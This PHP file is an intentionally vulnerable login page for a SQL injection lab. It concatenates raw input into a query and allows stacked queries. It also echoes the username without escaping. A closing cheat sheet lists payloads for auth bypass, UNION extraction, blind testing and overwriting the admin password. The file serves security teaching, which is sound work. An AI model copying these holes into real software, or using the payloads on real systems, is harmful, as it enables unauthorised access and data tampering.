<?php
/**
 * authentication.php — VULNERABLE (Intentionally Insecure)
 *
 * WARNING: This file is intentionally vulnerable to SQL Injection.
 
 *
 * Vulnerabilities demonstrated:
 *  1. Unsanitized user input directly in SQL query
 *  2. SQL errors displayed to the user
 *  3. No prepared statements
 *  4. Uses mysqli_multi_query to allow stacked queries (modification attacks)
 */

include 'connection.php';

// Keep this demo page from crashing on invalid injection payloads.
mysqli_report(MYSQLI_REPORT_OFF);

// --- Retrieve raw user input (NO sanitization — intentionally vulnerable) ---
$username = $_POST['username'] ?? '';
$password = $_POST['password'] ?? '';

// ============================================================
// VULNERABLE QUERY — as required by the assignment
// ============================================================
$sql = "SELECT * FROM users WHERE username='$username' AND password='$password'";

// Use multi_query to allow stacked queries (INSERT / UPDATE via injection)
$queryResult = false;
$mysqlError = '';

if (@mysqli_multi_query($conn, $sql)) {
    $queryResult = true;
} else {
    $mysqlError = mysqli_error($conn);
}

// Collect first result set
$result = false;
if ($queryResult) {
    $result = mysqli_store_result($conn);
    // Flush remaining results (from stacked queries)
    while (mysqli_more_results($conn)) {
        mysqli_next_result($conn);
        $extra = mysqli_store_result($conn);
        if ($extra) mysqli_free_result($extra);
    }
}

$rows = [];
if ($result && mysqli_num_rows($result) > 0) {
    while ($row = mysqli_fetch_assoc($result)) {
        $rows[] = $row;
    }
}

$loginSuccess = count($rows) > 0;
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title><?= $loginSuccess ? 'Login Successful' : 'Login Failed' ?> — Vulnerable App</title>
    <link rel="stylesheet" href="style.css">
</head>
<body>

<div class="result-card">

    <span class="app-badge vulnerable">⚠ Vulnerable App</span>

    <?php if ($loginSuccess): ?>
        <h2 class="success-msg">✔ Login Successful!</h2>
        <p style="color:#7b7f9e;font-size:.9rem;margin-bottom:.6rem">
            Welcome, <strong style="color:#e8eaf0"><?= $username ?></strong>
        </p>
    <?php else: ?>
        <h2 class="error-msg">✖ Login Failed</h2>
        <p style="color:#7b7f9e;font-size:.9rem;margin-bottom:.6rem">
            No matching record found in the database.
        </p>
    <?php endif; ?>

    <hr class="divider">

    <!-- Show the raw SQL query (educational — never do this in production) -->
    <div class="query-box">
        <span class="label">SQL Query Executed</span>
        <?= htmlspecialchars($sql) ?>
    </div>

    <?php if ($mysqlError): ?>
    <div class="warning-box">
        <strong>MySQL Error (exposed!):</strong><br>
        <?= htmlspecialchars($mysqlError) ?>
    </div>
    <?php endif; ?>

    <?php if ($loginSuccess): ?>
    <!-- Show all rows returned (UNION injection may return extra rows) -->
    <p style="font-size:.82rem;color:#7b7f9e;margin-top:1rem;margin-bottom:.4rem">
        Rows returned by query:
    </p>
    <table class="data-table">
        <thead>
            <tr>
                <?php foreach (array_keys($rows[0]) as $col): ?>
                    <th><?= htmlspecialchars($col) ?></th>
                <?php endforeach; ?>
            </tr>
        </thead>
        <tbody>
            <?php foreach ($rows as $row): ?>
            <tr>
                <?php foreach ($row as $val): ?>
                    <td><?= htmlspecialchars((string)$val) ?></td>
                <?php endforeach; ?>
            </tr>
            <?php endforeach; ?>
        </tbody>
    </table>
    <?php endif; ?>

    <!-- Quick-ref injection cheat-sheet -->
    <div class="info-box" style="margin-top:1.4rem">
        <strong style="color:#a78bfa">Attack Payloads Reference:</strong><br><br>
        <code style="color:#ff8a95">Auth Bypass:</code>
        Username: <code>' OR '1'='1' -- </code> / Password: <code>anything</code><br>
        <span style="color:#7b7f9e">Keep the space after <code>--</code> and do not add a trailing quote.</span><br><br>
        <code style="color:#ff8a95">Union Injection:</code>
        Username: <code>' UNION SELECT id,username,password FROM users -- </code><br><br>
        <code style="color:#ff8a95">Blind (True):</code>
        Username: <code>admin' AND 1=1 -- </code> / Password: <code>anything</code><br><br>
        <code style="color:#ff8a95">Blind (False):</code>
        Username: <code>admin' AND 1=2 -- </code> / Password: <code>anything</code><br><br>
        <code style="color:#ff8a95">DB Modification:</code>
        Username: <code>'; UPDATE users SET password='hacked' WHERE username='admin' -- </code>
    </div>

    <a class="back-link" href="index.php">← Back to Login</a>
</div>

<footer>SNS Lab 5 · SQL Injection Demo · IIIT Hyderabad</footer>
</body>
</html>
